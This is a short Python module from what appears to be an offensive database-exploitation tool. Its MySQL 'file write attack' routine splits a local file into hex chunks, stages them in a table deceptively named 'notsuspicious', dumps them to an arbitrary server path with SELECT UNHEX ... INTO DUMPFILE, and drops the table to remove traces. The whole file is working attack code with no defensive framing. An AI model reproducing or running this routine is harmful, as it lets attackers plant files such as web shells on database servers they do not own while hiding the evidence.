import logging
import binascii

log = logging.getLogger(__name__)

class DatabaseException(Exception):
    pass

class Database(object):
    '''Abstract the SQL statements per database implementation.'''
    def __init__(self):
        pass

    def filewrite_sequence(self, db, pathfrom, pathto):
        if db == 'mysql':
            return self._filewrite_seq_myqsl(pathfrom, pathto)

        raise DatabaseException('file write attack only supported on mysql.')

    def _filewrite_seq_myqsl(self, pathfrom, pathto):
        table = 'notsuspicious'
        statements = []
        statements.append('CREATE TABLE {} (data BLOB)'.format(table))
        chunk_len = 128
        with open(pathfrom, 'rb') as fd:
            chunk = fd.read(chunk_len)
            data = str(binascii.b2a_hex(chunk))[2:-1]   # the [2:-1] strips the b'...' from the string.
            statements.append('INSERT INTO {} (data) VALUES(\'{}\')'.format(table, data))
            while chunk:
                chunk = fd.read(chunk_len)
                if chunk:
                    data = str(binascii.b2a_hex(chunk))[2:-1]  
                    statements.append('UPDATE {} SET data=CONCAT(data, \'{}\')'.format(table, data))

        # now read it out of the database and into a file.
        statements.append('SELECT UNHEX(data) FROM {} INTO DUMPFILE \'{}\''.format(table, pathto))
        statements.append('DROP TABLE {}'.format(table))

        return statements
